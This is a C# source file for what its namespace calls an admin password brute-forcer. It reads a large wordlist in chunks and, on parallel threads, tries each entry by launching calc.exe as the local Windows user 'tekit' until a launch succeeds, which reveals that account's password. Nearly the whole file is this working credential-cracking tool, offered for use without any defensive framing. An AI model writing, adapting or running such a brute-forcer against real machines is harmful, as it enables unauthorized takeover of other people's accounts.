using System.Diagnostics;
using System.Security;

namespace AdminPasswordBrutforce;

public class Password
{
    public static string RealPassword { get; private set; }
    private static List<string> passwords { get; set; }

    private static int _currentLine;
    private const int _listSize = 300;
    private string _passwordsFilePath = @"E:\realhuman_phill.txt";
    private PartlyFileReader _partlyFileReader;

    public Password()
    {
        _currentLine = 0;
        passwords = new List<string>();
        _partlyFileReader = new PartlyFileReader(_passwordsFilePath, _listSize);
        _partlyFileReader.Start();
    }

    public bool CrackPassword()
    {
        while (RealPassword == null)
        {
            int taskCount = _partlyFileReader.Data.Count;
            CountdownEvent countdownEvent = new CountdownEvent(taskCount);

            for (int i = 0; i < taskCount; i++)
            {
                var i1 = i;
                ThreadPool.QueueUserWorkItem(state => { CheckPassword(_partlyFileReader.Data[i1], countdownEvent); });
            }


            countdownEvent.Wait();
            _partlyFileReader.Resume();

            while (!_partlyFileReader.IsPaused)
            {
                Thread.Sleep(100);
            }
        }

        return true;
    }

    public static void CheckPassword(string pass, CountdownEvent countdownEvent)
    {
        if (RealPassword == null)
        {
            try
            {
                using (SecureString ss = new SecureString())
                {
                    pass = pass.Trim();
                    foreach (var item in pass)
                    {
                        ss.AppendChar(item);
                    }

                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        WorkingDirectory = @"C:\Windows\System32\",
                        FileName = "calc.exe",
                        UserName = "tekit",
                        Password = ss,
                        UseShellExecute = false
                    };

                    using (Process pr = new Process { StartInfo = startInfo })
                    {
                        Console.WriteLine();
                        pr.Start();
                        RealPassword = pass;
                    }
                }
            }
            catch (Exception exception)
            {
                Console.Write("*");
            }
        }
        else
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("PASSWORD FOUND: " + "RealPassword");
            Console.ResetColor();
        }

        countdownEvent.Signal();
    }
}